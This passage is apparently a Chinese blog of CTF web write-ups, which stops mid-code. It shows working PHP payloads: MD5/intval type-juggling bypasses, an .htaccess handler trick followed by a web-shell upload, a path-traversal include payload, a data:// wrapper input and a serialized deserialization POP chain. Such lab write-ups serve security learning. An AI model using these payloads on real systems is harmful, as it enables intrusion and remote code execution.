<p>可以看到是要通过四个if的检测才能成功拿到flag</p>
<p>第一个if检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))</span><br></pre></td></tr></table></figure>

<p>会进行取整，直接进行数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以看到成功绕过</p>
<p>第二个和第三个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])</span><br><span class="line">if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))</span><br></pre></td></tr></table></figure>

<p>要求POST传参b1和b2，并且传上去的参数本身值不同，但md5值要相同</p>
<p>直接用数组进行绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1[]=2&amp;b2[]=3</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>成功绕过</p>
<p>最后一个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))</span><br></pre></td></tr></table></figure>

<p>要求传上去的值为字符串且值不同但是md5值要相同</p>
<p>直接使用0e开头的科学计数法就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1=s878926199a&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>直接就拿到了flag</p>
<h2 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目就是一个文件上传的界面，nss标签提醒了是MIME验证并且要用到.htaccess文件，当我们尝试上传php文件时发现回显是不能上传后缀名为ph的文件，所以抓包改后缀，同时要改Content-type</p>
<p>先抓包上传.htaccess文件，文件内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch  &quot;wen&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现上传成功，下一步就是上传后缀名为wen的真正的木马文件，注意也要改content-type</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>发现又上传成功，接下来将路径复制下来加在题目地址后面就行，用hackbar执行命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/993203c1a20fe34d2fc406badd31d804/muma2.wen</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>成功拿到flag。</p>
<h2 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h2><p>题目一进去就只有一个按键，并且点击之后只出来一个弹窗就没反应了，所以按F12看看</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现让我们访问src</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>发现是一个flask所写的轻量化web程序</p>
<p>如果以get方式访问&#x2F;路由，就返回index.html的内容</p>
<p>如果以get方式访问&#x2F;src路由，就返回app.py的内容</p>
<p>如果以PUT方式访问&#x2F;super-secret-route-nobody-will-guess，就返回flag文件的内容</p>
<p>所以果断选第三个</p>
<p>直接抓包改代理，将传输方式改为PUT方式即可</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<h2 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h2><p>题目一进去是一张很欠的表情包，F12查看源码，访问source.php得到题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现了hint.php</p>
<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>我们知道了flag的位置，再退回上一步审计代码</p>
<p>先说说整体的逻辑：</p>
<ol>
<li>首先，使用highlight_file函数将当前文件的源代码输出，即将代码以语法高亮的形式显示出来。</li>
<li>然后定义了一个名为emmm的类，其中包含了一个名为checkFile的静态方法。这个方法用来检查并允许包含指定文件。</li>
<li>在checkFile方法中，首先定义了一个白名单数组$whitelist，包含了允许访问的文件名。</li>
<li>接着，通过检查传入的page参数，判断是否符合条件。如果page为空或不是一个字符串，将输出”you can’t see it”并返回false。</li>
<li>如果$page在白名单数组中存在，直接返回true。</li>
<li>否则，首先对page参数进行处理，截取其中的部分字符直到遇到第一个问号（?）为止，并赋值给<em>p<strong>a</strong>g**e</em>进行处理，截取其中的部分字符直到遇到第一个问号（?）为止，并赋值给_page变量。</li>
<li>然后按照同样的逻辑，对$_page进行处理，再次截取部分字符直到遇到第一个问号（?）为止。</li>
<li>最后，对$_page进行URL解码，并再次进行截取处理。</li>
<li>如果最终的$_page在白名单数组中存在，返回true。</li>
<li>如果以上条件都不满足，将输出”you can’t see it”并返回false。</li>
<li>在主程序中，首先检查请求中是否存在名为file的参数，并且该参数是一个非空字符串。然后调用emmm类的checkFile方法进行文件检查。</li>
<li>如果文件检查通过，使用include语句包含请求中指定的文件，并立即退出程序。</li>
<li>如果文件检查不通过，将输出一段HTML代码，其中包含了一个图片的URL。</li>
</ol>
<p>接下来再说说其中的一些函数：</p>
<p>mb_substr(str,start,length,encoding):返回从start位置开始的长度为length的字符串。</p>
<p>mb_strpos(str,find_str,offset,encoding):返回str中从offset(默认为0)开始第一次出现find_str的位置。</p>
<p>urlcode():对其传入的str参数进行str解码。</p>
<p>到这里问完了chatgpt之后就麻了，不知道下一步该怎么办</p>
<p>这里看wp，知道了include比较阴间的一个小特性：include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p>
<p>使用..&#x2F;逐级进行跳转，最终得到正确的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>source.php换成hint.php也可，就得到了flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHCTF%202018%5DWarmup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<h2 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h2><p>这道题是一个源码泄露，一开始以为是git泄露，还去拿githacker扫描了一下，发现没有反应</p>
<p>有用ddiresearch试了试，发现了返回状态唯一正常的两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www.rar                         /test.txt</span><br></pre></td></tr></table></figure>

<p>尝试进行访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>这是test.txt的内容</p>
<p>他会读取cxk所传入文件的值，如果文件的值为ctrl，就打印出flag</p>
<p>再下载<a target="_blank" rel="noopener" href="http://www.rar,查看其中内容/">www.rar，查看其中内容</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">恭喜你</span><br><span class="line">turn to</span><br><span class="line"></span><br><span class="line">/orzorz.php</span><br></pre></td></tr></table></figure>

<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cxk&#x27;]))&#123;</span><br><span class="line">    $cxk=$_GET[&#x27;cxk&#x27;];</span><br><span class="line">    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;洗洗睡吧&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;nononoononoonono&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; nononoononoonono</span><br></pre></td></tr></table></figure>

<p>这个php文件里才是可执行源码</p>
<p>为了达到传入文件参数，且内容为ctrl，就使用data:&#x2F;&#x2F;数据流协议：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cxk=data://text/plain,ctrl</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>就拿到了flag。</p>
<h2 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h2><p>先看题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    function echo_name()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;Pk very safe^.^&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;cinder))  </span><br><span class="line">            return $this-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function echo_name()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;keystone lost~&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pks&#x27;]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">    echo $logData; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先来说说链子，敏感函数肯定是怎么触发file_get_content函数</p>
<p>然后要触发echo_name函数，找了找发现acp的to_string里面用到了这个函数，并且使acp的this-&gt;cinder&#x3D;new ace()就可以了</p>
<p>链子构造出来很简单，但是这道题有两个比较难的点：</p>
<p>一个是从未出现过的$heat变量，一个是unserialize($this-&gt;docker)。如何满足$this-&gt;openstack-&gt;neutron &#x3D;&#x3D;&#x3D; $this-&gt;openstack-&gt;nova是这道题的关键。</p>
<h3 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h3><p>到这里始终想不到怎么满足这个条件，就去看了wp，官方wp是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> <span class="title function_ invoke__">ace</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder)) </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;docker = <span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cls</span> = <span class="keyword">new</span> <span class="title function_ invoke__">acp</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cls</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cls</span>;</span><br></pre></td></tr></table></figure>

<p>前面的都不难理解，主要是docker的内容是什么意思呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;stdClass&quot;:2:&#123;s:7:&quot;neutron&quot;;s:1:&quot;a&quot;;s:4:&quot;nova&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>

<p>根据序列化后的字段进行分析，这个R:2是什么意思？</p>
<p>根据wp的所给验证方法，终于明白了，我们来看看</p>
<p>构造一个类进行验证：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$q</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$n</span>,<span class="variable">$o</span>,<span class="variable">$p</span>,<span class="variable">$q</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;m = <span class="variable">$m</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;n = <span class="variable">$n</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;o = <span class="variable">$o</span>; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;q = <span class="variable">$q</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$i0clay</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$i0clay</span>-&gt;m = &amp;<span class="variable">$i0clay</span>-&gt;n; <span class="comment">//声明变量m，引用自变量n</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$i0clay</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:5:&#123;s:1:&quot;m&quot;;i:1;s:1:&quot;n&quot;;R:2;s:1:&quot;o&quot;;i:1;s:7:&quot;Testq&quot;;b:1;s:4:&quot;*p&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是这里 R 所处的位置是被引用的变量 n 而非 m。那么 2 这个数字又代表什么呢？受 R 所处位置的启发，尝试更换 m 为其他变量：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$n</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">private</span> 